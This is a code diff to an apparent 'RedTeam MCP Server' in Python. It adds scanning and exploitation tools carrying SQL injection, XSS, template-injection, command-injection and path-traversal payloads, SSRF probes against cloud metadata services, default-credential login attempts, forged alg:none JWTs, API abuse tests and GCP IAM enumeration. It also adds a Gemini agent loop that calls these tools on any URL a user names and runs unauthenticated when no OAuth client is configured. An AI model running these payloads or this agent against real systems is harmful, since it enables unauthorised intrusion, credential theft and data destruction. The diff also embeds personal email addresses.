@@ -22,6 +22,7 @@ from urllib.parse import urlparse, urljoin, urlencode, parse_qs
 from fastapi import FastAPI, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import HTMLResponse, JSONResponse
+from starlette.middleware.base import BaseHTTPMiddleware
 from mcp.server.fastmcp import FastMCP
 
 try:
@@ -39,6 +40,48 @@ ATOMICS_PATH = os.getenv("ATOMICS_PATH", "/tmp/atomic-red-team/atomics")
 GCP_PROJECT = os.getenv("GCP_PROJECT", "tito-436719")
 LOG_DIR = os.getenv("REDTEAM_LOG_DIR", os.path.expanduser("~/redteam-logs"))
 PORT = int(os.getenv("PORT", "8090"))
+OAUTH_CLIENT_ID = os.getenv("OAUTH_CLIENT_ID", "")
+ALLOWED_EMAILS = set(e.strip() for e in os.getenv("ALLOWED_EMAILS", "carter@linus.joonix.net,dnehoda@gmail.com").split(",") if e.strip())
+GEMINI_MODEL = os.getenv("GEMINI_MODEL", "gemini-2.5-flash")
+
+
+def _get_adc_token() -> str:
+    import google.auth
+    import google.auth.transport.requests
+    creds, _ = google.auth.default(scopes=["https://www.googleapis.com/auth/cloud-platform"])
+    creds.refresh(google.auth.transport.requests.Request())
+    return creds.token
+
+
+class SessionStore:
+    def __init__(self):
+        self.sessions: dict = {}
+
+    def get_or_create(self, session_id: str) -> dict:
+        if session_id not in self.sessions:
+            self.sessions[session_id] = {"chat_history": [], "command_history": []}
+        return self.sessions[session_id]
+
+    def append_history(self, session_id: str, role: str, text: str):
+        s = self.get_or_create(session_id)
+        s["chat_history"].append({"role": role, "parts": [{"text": text}]})
+        if len(s["chat_history"]) > 30:
+            s["chat_history"] = s["chat_history"][-30:]
+
+    def get_history(self, session_id: str) -> list:
+        return self.sessions.get(session_id, {}).get("chat_history", [])
+
+    def append_command(self, session_id: str, command: str, result_summary: str):
+        s = self.get_or_create(session_id)
+        s["command_history"].append({"ts": datetime.now(timezone.utc).isoformat(), "command": command, "result": result_summary})
+        if len(s["command_history"]) > 100:
+            s["command_history"] = s["command_history"][-100:]
+
+    def get_commands(self, session_id: str) -> list:
+        return self.sessions.get(session_id, {}).get("command_history", [])
+
+
+session_store = SessionStore()
 
 os.makedirs(LOG_DIR, exist_ok=True)
 
@@ -1195,10 +1238,353 @@ def discover_paths(url: str, wordlist: str = "common") -> str:
 
 
 # ═══════════════════════════════════════════════════════════════
+# EXPLOITATION TOOLS
+# ═══════════════════════════════════════════════════════════════
+
+_SQLI_PAYLOADS = ["'", "''", "' OR '1'='1", "' OR '1'='1'--", "1; DROP TABLE users--", "' UNION SELECT NULL--", "admin'--", "' OR 1=1--"]
+_XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", '"><script>alert(1)</script>', "javascript:alert(1)", "<svg onload=alert(1)>"]
+_SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "{{self.__dict__}}"]
+_CMD_PAYLOADS = ["; id", "| id", "`id`", "$(id)", "; whoami", "&& whoami", "; cat /etc/passwd"]
+_PATH_TRAVERSAL = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "....//etc/passwd", "%2e%2e%2fetc%2fpasswd", "..%2fetc%2fpasswd"]
+_SSRF_TARGETS = {
+    "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
+    "aws_metadata": "http://169.254.169.254/latest/meta-data/",
+    "azure_metadata": "http://169.254.169.254/metadata/instance",
+    "localhost": "http://localhost/",
+    "internal_169": "http://169.254.169.254/",
+}
+_WEAK_CREDS = [("admin","admin"),("admin","password"),("admin","123456"),("admin",""),("root","root"),("test","test"),("guest","guest"),("admin","admin123")]
+_JWT_NONE_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
+
+
+def _req(method, url, **kwargs):
+    """Safe request wrapper — no exceptions."""
+    try:
+        kwargs.setdefault("timeout", 8)
+        kwargs.setdefault("verify", False)
+        kwargs.setdefault("allow_redirects", False)
+        return requests.request(method, url, **kwargs)
+    except Exception as e:
+        return None
+
+
+@app_mcp.tool()
+def exploit_web_vulnerabilities(url: str, vuln_types: str = "all") -> str:
+    """Test a web target for common exploitable vulnerabilities.
+    vuln_types: comma-separated list of: sqli, xss, ssti, cmdi, path_traversal, open_redirect, or 'all'.
+    Returns findings with evidence for each vulnerability class tested."""
+    if not _HAS_REQUESTS:
+        return json.dumps({"error": "requests not installed"})
+    if not url.startswith("http"):
+        url = f"https://{url}"
+
+    types = [v.strip().lower() for v in vuln_types.split(",")] if vuln_types != "all" else ["sqli","xss","ssti","cmdi","path_traversal","open_redirect"]
+    findings = []
+    base = _req("GET", url)
+    base_len = len(base.text) if base else 0
+
+    # SQLi
+    if "sqli" in types:
+        for payload in _SQLI_PAYLOADS[:4]:
+            r = _req("GET", url, params={"id": payload, "q": payload, "search": payload})
+            if r and any(err in r.text.lower() for err in ["sql syntax","mysql","ora-","sqlite","pg::","unclosed quotation"]):
+                findings.append({"type": "SQL Injection", "severity": "CRITICAL", "payload": payload, "evidence": r.text[:200]})
+                break
+        for payload in _SQLI_PAYLOADS[:4]:
+            r = _req("POST", url, data={"username": payload, "password": "x", "q": payload})
+            if r and any(err in r.text.lower() for err in ["sql syntax","mysql","ora-","sqlite"]):
+                findings.append({"type": "SQL Injection (POST)", "severity": "CRITICAL", "payload": payload, "evidence": r.text[:200]})
+                break
+
+    # XSS
+    if "xss" in types:
+        for payload in _XSS_PAYLOADS[:3]:
+            r = _req("GET", url, params={"q": payload, "search": payload, "input": payload})
+            if r and payload.lower() in r.text.lower():
+                findings.append({"type": "Reflected XSS", "severity": "HIGH", "payload": payload, "param": "q/search/input"})
+                break
+
+    # SSTI
+    if "ssti" in types:
+        r = _req("GET", url, params={"name": "{{7*7}}", "template": "{{7*7}}"})
+        if r and "49" in r.text and "49" not in str(base_len):
+            findings.append({"type": "Server-Side Template Injection", "severity": "CRITICAL", "payload": "{{7*7}}", "evidence": "Response contains '49'"})
+
+    # Command injection
+    if "cmdi" in types:
+        for payload in _CMD_PAYLOADS[:3]:
+            r = _req("GET", url, params={"cmd": payload, "exec": payload, "ping": payload})
+            if r and any(kw in r.text for kw in ["uid=", "root:", "/bin/", "www-data"]):
+                findings.append({"type": "Command Injection", "severity": "CRITICAL", "payload": payload, "evidence": r.text[:200]})
+                break
+
+    # Path traversal
+    if "path_traversal" in types:
+        for payload in _PATH_TRAVERSAL[:4]:
+            r = _req("GET", url, params={"file": payload, "path": payload, "page": payload, "include": payload})
+            if r and ("root:" in r.text or "daemon:" in r.text):
+                findings.append({"type": "Path Traversal / LFI", "severity": "CRITICAL", "payload": payload, "evidence": r.text[:200]})
+                break
+
+    # Open redirect
+    if "open_redirect" in types:
+        for redir in ["https://evil.com", "//evil.com", "/\\evil.com"]:
+            r = _req("GET", url, params={"redirect": redir, "url": redir, "next": redir, "return": redir})
+            if r and r.status_code in [301,302,303,307,308]:
+                loc = r.headers.get("location","")
+                if "evil.com" in loc:
+                    findings.append({"type": "Open Redirect", "severity": "MEDIUM", "payload": redir, "location": loc})
+                    break
+
+    return json.dumps({"target": url, "findings": findings, "total": len(findings), "tested": types})
+
+
+@app_mcp.tool()
+def exploit_ssrf(url: str, param: str = "url", target: str = "all") -> str:
+    """Test a web application for Server-Side Request Forgery (SSRF).
+    param: the HTTP parameter to inject SSRF payloads into.
+    target: 'gcp_metadata', 'aws_metadata', 'azure_metadata', 'localhost', or 'all'.
+    Tests whether the server can be coerced into fetching internal/cloud metadata resources."""
+    if not _HAS_REQUESTS:
+        return json.dumps({"error": "requests not installed"})
+    if not url.startswith("http"):
+        url = f"https://{url}"
+
+    targets = {k: v for k,v in _SSRF_TARGETS.items() if target == "all" or k == target}
+    results = []
+    for name, ssrf_url in targets.items():
+        for p in [param, "url", "endpoint", "redirect", "fetch", "src", "uri"]:
+            r = _req("GET", url, params={p: ssrf_url}, headers={"Metadata-Flavor": "Google"})
+            if r and r.status_code == 200 and len(r.text) > 20:
+                vulnerable = any(kw in r.text.lower() for kw in ["project","instance","iam","ami-id","compute","metadata","hostname"])
+                results.append({"ssrf_target": name, "payload_url": ssrf_url, "param": p,
+                                 "status": r.status_code, "response_len": len(r.text),
+                                 "vulnerable": vulnerable, "snippet": r.text[:300] if vulnerable else ""})
+                if vulnerable:
+                    break
+
+    vulns = [r for r in results if r.get("vulnerable")]
+    return json.dumps({"target": url, "ssrf_findings": vulns, "all_probes": results, "vulnerable": len(vulns) > 0})
+
+
+@app_mcp.tool()
+def exploit_authentication(url: str, auth_type: str = "all") -> str:
+    """Test authentication mechanisms for common weaknesses.
+    auth_type: 'default_creds', 'jwt_none', 'jwt_weak', 'brute_force', or 'all'.
+    Tests login endpoints for default credentials, JWT algorithm confusion (none alg), and weak secrets."""
+    if not _HAS_REQUESTS:
+        return json.dumps({"error": "requests not installed"})
+    if not url.startswith("http"):
+        url = f"https://{url}"
+
+    types = [auth_type] if auth_type != "all" else ["default_creds","jwt_none","brute_force"]
+    findings = []
+
+    # Default credentials
+    if "default_creds" in types:
+        login_paths = ["/login", "/admin", "/admin/login", "/wp-login.php", "/api/login", "/auth/login", "/signin", "/user/login"]
+        for path in login_paths:
+            target = url.rstrip("/") + path
+            r = _req("GET", target)
+            if not r or r.status_code == 404:
+                continue
+            for user, pwd in _WEAK_CREDS[:5]:
+                for payload in [{"username": user, "password": pwd}, {"user": user, "pass": pwd}, {"email": user, "password": pwd}]:
+                    r2 = _req("POST", target, json=payload)
+                    r3 = _req("POST", target, data=payload)
+                    for resp in [r2, r3]:
+                        if resp and resp.status_code in [200,302] and any(kw in resp.text.lower() for kw in ["dashboard","welcome","token","session","logout"]):
+                            findings.append({"type": "Default Credentials", "severity": "CRITICAL", "path": path, "credentials": f"{user}:{pwd}"})
+
+    # JWT none algorithm attack
+    if "jwt_none" in types:
+        # Forge a JWT with alg:none and a typical admin payload
+        import base64
+        payload_b64 = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin","iat":1700000000,"exp":9999999999}).encode()).rstrip(b"=").decode()
+        forged_jwt = f"{_JWT_NONE_HEADER}.{payload_b64}."
+        for path in ["/api/me", "/api/user", "/api/profile", "/dashboard", "/admin"]:
+            target = url.rstrip("/") + path
+            r = _req("GET", target, headers={"Authorization": f"Bearer {forged_jwt}"})
+            if r and r.status_code == 200 and len(r.text) > 50:
+                findings.append({"type": "JWT None Algorithm", "severity": "CRITICAL", "path": path,
+                                  "token": forged_jwt[:60] + "...", "evidence": r.text[:200]})
+
+    return json.dumps({"target": url, "findings": findings, "total": len(findings), "tested": types})
+
+
+@app_mcp.tool()
+def exploit_cloud_iam(project_id: str = "") -> str:
+    """Enumerate GCP IAM misconfigurations and privilege escalation paths.
+    Checks for: overly permissive service accounts, public IAM bindings, editor/owner roles on SAs,
+    service accounts with user-managed keys, and potential escalation paths via impersonation."""
+    project = project_id or GCP_PROJECT
+    findings = []
+    try:
+        import google.auth
+        import google.auth.transport.requests
+        creds, detected_project = google.auth.default(scopes=["https://www.googleapis.com/auth/cloud-platform"])
+        creds.refresh(google.auth.transport.requests.Request())
+        token = creds.token
+        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
+        base = "https://cloudresourcemanager.googleapis.com/v1"
+
+        # Get IAM policy
+        policy_resp = requests.get(f"{base}/projects/{project}:getIamPolicy", headers=headers, timeout=15)
+        if policy_resp.status_code != 200:
+            return json.dumps({"error": f"IAM policy fetch failed: {policy_resp.text[:200]}"})
+        policy = policy_resp.json()
+
+        dangerous_roles = {"roles/owner","roles/editor","roles/iam.securityAdmin","roles/iam.serviceAccountTokenCreator","roles/iam.serviceAccountAdmin"}
+        for binding in policy.get("bindings", []):
+            role = binding.get("role","")
+            members = binding.get("members",[])
+            if "allUsers" in members or "allAuthenticatedUsers" in members:
+                findings.append({"severity":"CRITICAL","issue":"Public IAM binding","role":role,"members":members})
+            if role in dangerous_roles:
+                sa_members = [m for m in members if "serviceAccount" in m]
+                if sa_members:
+                    findings.append({"severity":"HIGH","issue":f"Service account with {role}","role":role,"service_accounts":sa_members})
+
+        # List service accounts and check for user-managed keys
+        sa_resp = requests.get(f"https://iam.googleapis.com/v1/projects/{project}/serviceAccounts", headers=headers, timeout=15)
+        if sa_resp.status_code == 200:
+            sas = sa_resp.json().get("accounts", [])
+            for sa in sas:
+                email = sa.get("email","")
+                keys_resp = requests.get(f"https://iam.googleapis.com/v1/projects/{project}/serviceAccounts/{email}/keys", headers=headers, timeout=10)
+                if keys_resp.status_code == 200:
+                    user_keys = [k for k in keys_resp.json().get("keys",[]) if k.get("keyType") == "USER_MANAGED"]
+                    if user_keys:
+                        findings.append({"severity":"HIGH","issue":"Service account with user-managed keys","sa":email,"key_count":len(user_keys)})
+
+        return json.dumps({"project": project, "findings": findings, "total": len(findings),
+                           "escalation_risk": "HIGH" if any(f["severity"]=="CRITICAL" for f in findings) else "MEDIUM" if findings else "LOW"})
+    except Exception as e:
+        return json.dumps({"error": str(e)})
+
+
+@app_mcp.tool()
+def exploit_api_security(url: str, tests: str = "all") -> str:
+    """Test REST API endpoints for security vulnerabilities.
+    tests: comma-separated: idor, mass_assignment, broken_auth, rate_limit, verb_tampering, or 'all'.
+    Probes the API for broken object-level auth, excessive data exposure, missing rate limiting, and HTTP verb tampering."""
+    if not _HAS_REQUESTS:
+        return json.dumps({"error": "requests not installed"})
+    if not url.startswith("http"):
+        url = f"https://{url}"
+
+    test_list = [t.strip() for t in tests.split(",")] if tests != "all" else ["idor","mass_assignment","broken_auth","rate_limit","verb_tampering"]
+    findings = []
+    api_paths = ["/api/users", "/api/user", "/api/accounts", "/api/admin", "/api/v1/users", "/v1/users", "/users"]
+
+    # IDOR
+    if "idor" in test_list:
+        for path in api_paths:
+            for obj_id in ["1","2","../1","0","99999"]:
+                r = _req("GET", url.rstrip("/") + f"{path}/{obj_id}")
+                if r and r.status_code == 200 and len(r.text) > 30:
+                    try:
+                        data = r.json()
+                        if isinstance(data, dict) and any(k in data for k in ["email","password","ssn","token","secret","key"]):
+                            findings.append({"type":"IDOR","severity":"HIGH","path":f"{path}/{obj_id}","exposed_fields":[k for k in ["email","password","token","secret"] if k in data]})
+                    except Exception:
+                        pass
+
+    # Mass assignment
+    if "mass_assignment" in test_list:
+        for path in api_paths:
+            r = _req("POST", url.rstrip("/") + path, json={"username":"test","password":"test","role":"admin","is_admin":True,"privilege":"admin"})
+            if r and r.status_code in [200,201]:
+                try:
+                    data = r.json()
+                    if isinstance(data,dict) and data.get("role") == "admin" or data.get("is_admin"):
+                        findings.append({"type":"Mass Assignment","severity":"HIGH","path":path,"evidence":str(data)[:200]})
+                except Exception:
+                    pass
+
+    # HTTP verb tampering
+    if "verb_tampering" in test_list:
+        for path in api_paths:
+            target = url.rstrip("/") + path
+            r_get = _req("GET", target)
+            if r_get and r_get.status_code == 403:
+                for verb in ["HEAD","OPTIONS","TRACE","PATCH","PUT","DELETE"]:
+                    r2 = _req(verb, target)
+                    if r2 and r2.status_code not in [403,405,501]:
+                        findings.append({"type":"HTTP Verb Tampering","severity":"MEDIUM","path":path,"blocked_verb":"GET","allowed_verb":verb,"status":r2.status_code})
+
+    # Rate limiting
+    if "rate_limit" in test_list:
+        login_url = url.rstrip("/") + "/api/login"
+        codes = []
+        for i in range(15):
+            r = _req("POST", login_url, json={"username":"admin","password":f"wrong{i}"})
+            if r:
+                codes.append(r.status_code)
+        if codes and not any(c in codes for c in [429,423,403]):
+            findings.append({"type":"Missing Rate Limiting","severity":"MEDIUM","path":"/api/login","requests_sent":15,"no_throttle":True})
+
+    return json.dumps({"target": url, "findings": findings, "total": len(findings), "tested": test_list})
+
+
+# ═══════════════════════════════════════════════════════════════
 # FASTAPI WEB SERVER + MCP SSE
 # ═══════════════════════════════════════════════════════════════
 
 app = FastAPI(title="RedTeam MCP Server")
+
+
+class SecurityHeadersMiddleware(BaseHTTPMiddleware):
+    async def dispatch(self, request, call_next):
+        response = await call_next(request)
+        response.headers["X-Content-Type-Options"] = "nosniff"
+        response.headers["X-Frame-Options"] = "DENY"
+        response.headers["X-XSS-Protection"] = "1; mode=block"
+        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=(), payment=()"
+        response.headers["Cross-Origin-Opener-Policy"] = "same-origin-allow-popups"
+        response.headers["Cross-Origin-Resource-Policy"] = "same-origin"
+        response.headers["Server"] = "redteam-mcp"
+        response.headers["Content-Security-Policy"] = (
+            "default-src 'self'; "
+            "script-src 'self' 'unsafe-inline' https://accounts.google.com; "
+            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
+            "font-src 'self' https://fonts.gstatic.com; "
+            "img-src 'self' data: https:; "
+            "connect-src 'self'; "
+            "frame-src https://accounts.google.com; "
+            "frame-ancestors 'none';"
+        )
+        return response
+
+app.add_middleware(SecurityHeadersMiddleware)
+
+
+def _verify_google_token(request: Request) -> str | None:
+    """Verify Google ID token. Returns email on success, None on failure. No-op if OAUTH_CLIENT_ID unset."""
+    if not OAUTH_CLIENT_ID:
+        return "dev"
+    auth = request.headers.get("Authorization", "")
+    if not auth.startswith("Bearer "):
+        return None
+    token = auth[7:]
+    try:
+        from google.oauth2 import id_token as gid_token
+        from google.auth.transport import requests as g_requests
+        info = gid_token.verify_oauth2_token(token, g_requests.Request(), OAUTH_CLIENT_ID)
+        email = info.get("email", "")
+        if ALLOWED_EMAILS and email not in ALLOWED_EMAILS:
+            return None
+        return email
+    except Exception as e:
+        logger.warning(f"Token verification failed: {e}")
+        return None
+
+
+@app.get("/api/auth-config")
+async def api_auth_config():
+    return {"client_id": OAUTH_CLIENT_ID, "auth_required": bool(OAUTH_CLIENT_ID)}
 
 
 @app.get("/health")
@@ -1314,103 +1700,165 @@ app.mount("/sse", mcp_app)
 
 @app.post("/api/chat")
 async def chat(request: Request):
-    """Natural language chat endpoint that resolves queries to attacks."""
+    """Natural language chat endpoint powered by Gemini orchestration."""
+    if not _verify_google_token(request):
+        return JSONResponse({"error": "Unauthorized. Please sign in with Google."}, status_code=401)
+
     body = await request.json()
     message = body.get("message", "").strip()
     if not message:
         return JSONResponse({"error": "No message provided"})
 
-    msg_lower = message.lower()
+    session_id = body.get("session_id") or request.cookies.get("rt_session") or str(uuid.uuid4())
+    session_store.get_or_create(session_id)
 
-    # Web scanning intents
-    if any(w in msg_lower for w in ["scan web", "scan http", "scan url", "check headers", "pentest", "web vuln", "web app"]):
-        # Extract URL from message
-        url_match = re.search(r'https?://[^\s<>"]+|www\.[^\s<>"]+', message)
-        if url_match:
-            target_url = url_match.group(0)
-            if "header" in msg_lower:
-                result = json.loads(check_headers(target_url))
-                return JSONResponse({"response": f"Security headers audit for {target_url}", "type": "web_scan", "results": result})
-            elif "path" in msg_lower or "discover" in msg_lower or "dir" in msg_lower:
-                result = json.loads(discover_paths(target_url))
-                return JSONResponse({"response": f"Path discovery for {target_url}", "type": "web_scan", "results": result})
-            else:
-                result = json.loads(scan_web_app(target_url))
-                return JSONResponse({"response": f"Full web app scan for {target_url}", "type": "web_scan", "results": result})
-        return JSONResponse({"response": "Please provide a URL to scan. Example: 'scan web app https://example.com'"})
+    try:
+        # Build tool declarations from registered MCP tools
+        all_tools = list(app_mcp._tool_manager.list_tools())
+        tool_declarations = []
+        for tool in all_tools:
+            props, required = {}, []
+            if hasattr(tool, "inputSchema") and isinstance(tool.inputSchema, dict):
+                props = tool.inputSchema.get("properties", {})
+                required = tool.inputSchema.get("required", [])
+            tool_declarations.append({
+                "name": tool.name,
+                "description": tool.description or "",
+                "parameters": {"type": "object", "properties": props, "required": required},
+            })
 
-    # Report intents
-    if any(w in msg_lower for w in ["report", "reports"]):
-        if "list" in msg_lower or "show" in msg_lower or "all" in msg_lower:
-            summaries = [{"id": r["id"], "timestamp": r["timestamp"], "query": r["query"],
-                          "threat_level": r["threat_level"], "posture_score": r["posture_score"]}
-                         for r in reversed(REPORTS_STORE)]
-            return JSONResponse({"response": f"{len(summaries)} reports available", "type": "reports_list", "reports": summaries})
-        if REPORTS_STORE:
-            latest = REPORTS_STORE[-1]
-            return JSONResponse({"response": "Latest report", "type": "report", "report": latest["markdown"],
-                                 "report_id": latest["id"], "threat_level": latest["threat_level"]})
-        return JSONResponse({"response": "No reports generated yet. Run an attack simulation first."})
+        token = _get_adc_token()
+        gemini_url = (
+            f"https://us-central1-aiplatform.googleapis.com/v1/projects/{GCP_PROJECT}"
+            f"/locations/us-central1/publishers/google/models/{GEMINI_MODEL}:generateContent"
+        )
+        headers_ai = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
 
-    if any(w in msg_lower for w in ["list", "show", "what attacks", "available"]):
-        platform = "gcp" if "gcp" in msg_lower or "cloud" in msg_lower else "all"
-        techniques = resolve_techniques(message) if not any(w in msg_lower for w in ["all", "list all"]) else []
-        if techniques:
-            details = []
-            for tid in techniques:
-                tech = STRATUS_TECHNIQUES.get(tid) or ATOMIC_TECHNIQUES.get(tid)
-                details.append({"id": tid, "name": tech.get("name", tid) if tech else tid})
-            return JSONResponse({"response": f"Found {len(details)} matching techniques", "techniques": details})
-        all_tech = list(STRATUS_TECHNIQUES.values()) + list(ATOMIC_TECHNIQUES.values())[:50]
-        return JSONResponse({"response": f"{len(all_tech)} techniques available", "techniques": all_tech})
+        system_instruction = {"parts": [{"text": (
+            "You are an expert red team operator and attack simulation engine with full exploitation capabilities.\n\n"
+            "TOOL ROUTING — always use a tool, never answer from memory:\n"
+            "- 'list / show / what attacks / techniques' → list_attacks\n"
+            "- 'info / details / describe technique' → attack_info\n"
+            "- 'simulate / run / execute / detonate / test attack' → simulate_attack\n"
+            "- 'cleanup / revert / undo' → cleanup_attack\n"
+            "- 'warmup / prepare' → warmup_attack\n"
+            "- 'status / state of attacks' → attack_status\n"
+            "- 'scan web / pentest URL / web vulnerabilities / exploit web' → exploit_web_vulnerabilities\n"
+            "- 'check headers / header security' → check_headers\n"
+            "- 'SSRF / server-side request forgery / metadata service' → exploit_ssrf\n"
+            "- 'auth bypass / default creds / JWT / login weakness' → exploit_authentication\n"
+            "- 'API security / IDOR / broken auth / rate limit / verb tampering' → exploit_api_security\n"
+            "- 'IAM / privilege escalation / GCP permissions / service account' → exploit_cloud_iam\n"
+            "- 'discover paths / find endpoints / directory enum' → discover_paths\n"
+            "- 'resolve / find technique for ...' → resolve_attack_query\n"
+            "- 'report / generate report' → generate_report\n"
+            "- 'attack log / history' → attack_log\n\n"
+            "RULES:\n"
+            "- For ambiguous attack requests, use resolve_attack_query first to find matching technique IDs\n"
+            "- Always explain what a technique does before executing it\n"
+            "- Use dry_run=True when user says 'plan', 'preview', or 'what would happen'\n"
+            "- For comprehensive web assessments, chain: exploit_web_vulnerabilities → exploit_ssrf → exploit_authentication → exploit_api_security\n"
+            f"- Default GCP project: {GCP_PROJECT}\n"
+            "- After tool results, write a clear human-readable summary with severity ratings. NO raw JSON.\n"
+        )}]}
 
-    if any(w in msg_lower for w in ["simulate", "attack", "run", "execute", "detonate", "test", "inject"]):
-        dry_run = "dry" in msg_lower or "preview" in msg_lower or "plan" in msg_lower
-        techniques = resolve_techniques(message)
-        if not techniques:
-            return JSONResponse({"response": "No matching techniques found. Try: 'simulate credential theft', 'attack persistence', 'run lateral movement'", "techniques_matched": 0})
+        history = session_store.get_history(session_id)
+        contents = history + [{"role": "user", "parts": [{"text": message}]}]
+        tool_execution_log = []
+        final_text = ""
 
-        results = []
-        for tid in techniques:
-            tech = STRATUS_TECHNIQUES.get(tid) or ATOMIC_TECHNIQUES.get(tid)
-            if dry_run:
-                results.append({"id": tid, "name": tech.get("name", tid) if tech else tid, "dry_run": True})
-            else:
-                if tid.startswith("gcp."):
-                    results.append(_run_stratus(tid, action="detonate", project=GCP_PROJECT))
-                elif tid.startswith("T"):
-                    results.append(_run_atomic(tid))
+        for turn in range(6):
+            resp = requests.post(
+                gemini_url, headers=headers_ai,
+                json={"contents": contents, "tools": [{"functionDeclarations": tool_declarations}], "systemInstruction": system_instruction},
+                timeout=120,
+            )
+            if resp.status_code != 200:
+                return JSONResponse({"error": f"AI error [{resp.status_code}]: {resp.text[:200]}"})
 
-        response = {"response": f"{'Planned' if dry_run else 'Executed'} {len(results)} attack techniques", "results": results}
+            candidates = resp.json().get("candidates", [])
+            if not candidates:
+                break
+            content_data = candidates[0].get("content", {})
+            parts = content_data.get("parts", [])
+            contents.append(content_data)
 
-        # Auto-generate report for non-dry-run
-        if not dry_run and results:
-            report = _build_report(message, results, GCP_PROJECT)
-            response["type"] = "attack_with_report"
-            response["report"] = report["markdown"]
-            response["report_id"] = report["id"]
-            response["threat_level"] = report["threat_level"]
+            has_tool_call = any("functionCall" in p for p in parts)
+            if not has_tool_call:
+                for part in parts:
+                    if "text" in part:
+                        final_text += part["text"] + "\n"
+                break
 
-        return JSONResponse(response)
+            tool_responses = []
+            for part in parts:
+                if "functionCall" not in part:
+                    continue
+                tool_name = part["functionCall"]["name"]
+                tool_args = part["functionCall"].get("args", {})
+                try:
+                    tool_obj = app_mcp._tool_manager._tools.get(tool_name)
+                    if not tool_obj:
+                        result_text = f"Tool {tool_name} not found"
+                    else:
+                        result_text = tool_obj.fn(**tool_args)
+                        if not isinstance(result_text, str):
+                            result_text = str(result_text)
+                    tool_execution_log.append({"tool": tool_name, "args": tool_args, "result": result_text[:1000]})
+                    tool_responses.append({"functionResponse": {"name": tool_name, "response": {"result": result_text}}})
+                except Exception as e:
+                    err = f"Error: {str(e)}"
+                    tool_execution_log.append({"tool": tool_name, "args": tool_args, "result": err})
+                    tool_responses.append({"functionResponse": {"name": tool_name, "response": {"error": err}}})
 
-    if any(w in msg_lower for w in ["cleanup", "revert", "undo"]):
-        techniques = resolve_techniques(message)
-        results = [_run_stratus(tid, action="cleanup") for tid in techniques if tid.startswith("gcp.")]
-        return JSONResponse({"response": f"Cleaned up {len(results)} techniques", "results": results})
+            contents.append({"role": "user", "parts": tool_responses})
 
-    if any(w in msg_lower for w in ["status", "state"]):
-        return JSONResponse(json.loads(attack_status()))
+        # Parse any structured data from last tool result for UI rendering
+        last_result = tool_execution_log[-1]["result"] if tool_execution_log else None
+        response_data: dict = {"response": final_text.strip() or "Done.", "tool_log": tool_execution_log}
 
-    # Default: try to resolve as an attack query
-    techniques = resolve_techniques(message)
-    if techniques:
-        details = [{"id": tid, "name": (STRATUS_TECHNIQUES.get(tid) or ATOMIC_TECHNIQUES.get(tid, {})).get("name", tid)} for tid in techniques]
-        return JSONResponse({
-            "response": f"Matched {len(details)} techniques for '{message}'. Say 'simulate {message}' to execute.",
-            "techniques": details
-        })
+        # Try to surface structured results the UI knows how to render
+        if last_result:
+            try:
+                parsed = json.loads(last_result)
+                if isinstance(parsed, dict):
+                    if "results" in parsed:
+                        response_data["results"] = parsed["results"]
+                        response_data["type"] = "attack_with_report" if "report" in parsed else "results"
+                    if "techniques" in parsed:
+                        response_data["techniques"] = parsed["techniques"]
+                    if "markdown" in parsed:
+                        response_data["report"] = parsed["markdown"]
+                        response_data["type"] = "report"
+            except Exception:
+                pass
 
-    return JSONResponse({"response": "I didn't understand that. Try: 'simulate credential theft', 'list gcp attacks', 'scan web app https://example.com', 'show reports'"})
+        # Save to session history
+        session_store.append_history(session_id, "user", message)
+        session_store.append_history(session_id, "model", final_text.strip() or "Done.")
+        if tool_execution_log:
+            tools_run = ", ".join(t["tool"] for t in tool_execution_log)
+            session_store.append_command(session_id, message, f"Tools: {tools_run}")
+
+        response_data["session_id"] = session_id
+        resp = JSONResponse(response_data)
+        resp.set_cookie("rt_session", session_id, max_age=86400, samesite="lax")
+        return resp
+
+    except Exception as e:
+        logger.error(f"Chat error: {e}")
+        return JSONResponse({"error": str(e)}, status_code=500)
+
+
+@app.get("/api/history")
+async def api_history(request: Request):
+    session_id = request.cookies.get("rt_session") or request.query_params.get("session_id", "")
+    if not session_id:
+        return JSONResponse({"commands": [], "chat": []})
+    return JSONResponse({
+        "commands": session_store.get_commands(session_id),
+        "chat": session_store.get_history(session_id),
+    })
 
 
 if __name__ == "__main__":
